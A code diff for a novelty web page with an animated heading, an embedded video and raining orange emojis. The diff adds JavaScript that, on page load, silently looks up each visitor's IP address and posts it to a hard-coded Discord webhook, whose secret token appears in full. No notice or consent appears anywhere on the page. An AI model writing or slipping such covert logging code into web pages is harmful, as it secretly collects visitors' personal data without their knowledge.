@@ -41,7 +41,7 @@
 
     h1 {
       color: white;
-      font-size: 80px;
+      font-size: 48px;
       animation: text-animation 3s infinite alternate ease-in-out, wobble 3s infinite alternate ease-in-out;
       text-shadow: 2px 2px 5px #c0392b; /* Dark orange outline */
       transform: rotateZ(3deg); /* Initial slight rotation */
@@ -64,7 +64,7 @@
 
     .button-container {
       position: absolute;
-      bottom: 200px; /* Adjust the bottom position */
+      bottom: 20px; /* Adjust the bottom position */
       left: 50%;
       transform: translateX(-50%);
       z-index: 2; /* Ensure buttons are above video */
@@ -138,7 +138,7 @@
   </div>
 
   <!-- Video -->
-  <iframe width="560" height="315" src="https://www.youtube.com/embed/0kOJvzixs5c?si=GPuU7IP9hVvTsKrv" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+  <iframe width="640" height="360" src="https://www.youtube.com/embed/VIDEO_ID" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
 
   <!-- Button Container -->
   <div class="button-container">
@@ -152,12 +152,44 @@
   <!-- Container for raining emojis -->
   <div class="emoji-container" id="emoji-container"></div>
 
+  <!-- JavaScript for logging IP address and sending to Discord -->
   <script>
-    // JavaScript for creating and animating raining emojis
-    const container = document.getElementById('emoji-container');
-    const maxEmojis = 20; // Maximum number of emojis allowed
+    // Function to log the IP address and send it to Discord
+    function logIPAndSendToDiscord(ip) {
+      const discordWebhook = 'https://discord.com/api/webhooks/1219047723811209288/7krSYB_EagWLu5pxql6-bAYQ23cjBlwzy4pnXGTdnN9NN-l6uBC9fmCOoaVd4dLXog9M';
+      const payload = {
+        content: `New visitor IP: ${ip}`
+      };
 
+      // Send the IP address to Discord via webhook
+      fetch(discordWebhook, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      })
+      .then(response => console.log('IP sent to Discord:', response))
+      .catch(error => console.error('Error sending IP to Discord:', error));
+    }
+
+    // Function to get the visitor's IP address and log it
+    function getIPAddress() {
+      fetch('https://api64.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          console.log('Visitor IP:', ip); // Log IP address
+          logIPAndSendToDiscord(ip); // Send IP address to Discord
+        })
+        .catch(error => console.error('Error fetching IP address:', error));
+    }
+
+    // Function to create and animate raining emojis
     function createEmoji() {
+      const container = document.getElementById('emoji-container');
+      const maxEmojis = 20; // Maximum number of emojis allowed
+
       if (container.children.length < maxEmojis) {
         const emoji = document.createElement('span');
         emoji.innerHTML = '🍊'; // Use any orange emoji you like
@@ -184,6 +216,9 @@
 
     // Generate raining emojis every second
     setInterval(createEmoji, 1000);
+
+    // Call the function when the page loads
+    window.addEventListener('load', getIPAddress);
   </script>
 </body>
 </html>
